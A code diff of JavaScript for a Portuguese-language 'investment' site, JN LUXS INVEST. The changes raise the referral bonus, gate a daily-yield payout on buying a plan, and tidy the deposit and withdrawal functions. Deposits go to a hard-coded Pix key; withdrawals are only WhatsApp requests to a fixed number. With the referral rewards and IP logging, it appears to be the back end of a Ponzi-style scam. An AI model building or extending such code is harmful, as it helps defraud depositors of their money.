@@ -18,7 +18,6 @@ const db = getDatabase(app);
 let usuarioAtual = null;
 let dadosUser = {};
 
-// COLETAR IP DO USUÁRIO
 async function obterIP() {
     try {
         const response = await fetch('https://api.ipify.org?format=json');
@@ -30,6 +29,8 @@ async function obterIP() {
 window.entrarOuCadastrar = async function() {
     const email = document.getElementById('campo-email').value;
     const senha = document.getElementById('campo-senha').value;
+    if(!email || !senha) { alert("Preencha e-mail e senha"); return; }
+    
     const ip = await obterIP();
     const params = new URLSearchParams(window.location.search);
     const indicadoPor = params.get('ref');
@@ -39,7 +40,8 @@ window.entrarOuCadastrar = async function() {
             set(ref(db, 'usuarios/' + res.user.uid), { 
                 email, saldo: 0, rendimentoDiario: 0, depositou: false, comprouPlano: false, ip: ip 
             });
-            if(indicadoPor) update(ref(db, 'usuarios/' + indicadoPor), { saldo: increment(3.20) });
+            // VALOR DE INDICAÇÃO ATUALIZADO PARA R$ 18,40
+            if(indicadoPor) update(ref(db, 'usuarios/' + indicadoPor), { saldo: increment(18.40) });
         });
     }).catch(e => alert("Erro: " + e.message));
 };
@@ -77,7 +79,7 @@ function iniciarContador() {
         contadorElem.innerText = `${horas.toString().padStart(2, '0')}:${minutos.toString().padStart(2, '0')}:${segundos.toString().padStart(2, '0')}`;
     }
 
-    if (tempoRestante <= 0) {
+    if (tempoRestante <= 0 && dadosUser.comprouPlano) {
         processarRendimento();
     } else {
         setTimeout(iniciarContador, 1000);
@@ -92,7 +94,6 @@ async function processarRendimento() {
     });
 }
 
-// SAQUE SEM TRAVA E COM NÚMERO NOVO
 window.sacar = () => {
     const nome = document.getElementById('saque-nome').value;
     const tipo = document.getElementById('saque-tipo-chave').value;
@@ -100,24 +101,22 @@ window.sacar = () => {
     const valor = parseFloat(document.getElementById('valor-saque').value);
 
     if (!nome || !chave || !valor) { alert("Preencha todos os campos!"); return; }
+    if (valor > (dadosUser.saldo || 0)) { alert("Saldo insuficiente!"); return; }
 
-    if (valor > (dadosUser.saldo || 0)) {
-        alert("Saldo insuficiente!");
-    } else {
-        const msg = `Olá, solicito saque de R$ ${valor.toFixed(2)}. \nNome: ${nome}\nChave ${tipo}: ${chave}`;
-        window.open(`https://wa.me/5589994713178?text=${encodeURIComponent(msg)}`);
-    }
+    const msg = `Olá, solicito saque de R$ ${valor.toFixed(2)}. \nNome: ${nome}\nChave ${tipo}: ${chave}`;
+    window.open(`https://wa.me/5589994713178?text=${encodeURIComponent(msg)}`);
 };
 
-// DEPÓSITO COM CÓPIA DE CHAVE E WHATSAPP DEPOIS DO PAGAMENTO
 window.depositar = () => {
-    const valor = parseFloat(document.getElementById('valor-pix').value);
+    const campoValor = document.getElementById('valor-deposito');
+    const valor = parseFloat(campoValor.value);
     const chavePix = "adc98ef9-90d1-4851-ab20-e9cee3a2d9a4";
 
     if (valor >= 60) {
         navigator.clipboard.writeText(chavePix).then(() => {
             alert("CHAVE PIX COPIADA!\n\n1. Pague R$ " + valor.toFixed(2) + " no seu banco.\n2. Após pagar, clique em OK para enviar o comprovante.");
             const msg = `Olá! Fiz um depósito de R$ ${valor.toFixed(2)}. Segue o comprovante para ativar meu saldo.`;
+            // SÓ ABRE O WHATSAPP DEPOIS DO OK DO ALERT
             window.open(`https://wa.me/5589994713178?text=${encodeURIComponent(msg)}`);
         });
     } else {
@@ -134,7 +133,12 @@ window.comprarPlano = async (custo, rend) => {
     } else { alert("Saldo insuficiente!"); }
 };
 
-window.copiarLink = () => { document.getElementById('link-afiliado').select(); document.execCommand("copy"); alert("Link copiado!"); };
+window.copiarLink = () => { 
+    const link = document.getElementById('link-afiliado');
+    link.select(); 
+    document.execCommand("copy"); 
+    alert("Link copiado!"); 
+};
 
 window.chamarSuporte = () => {
     const msg = "Olá! Gostaria de um atendimento VIP na JN LUXS INVEST.";
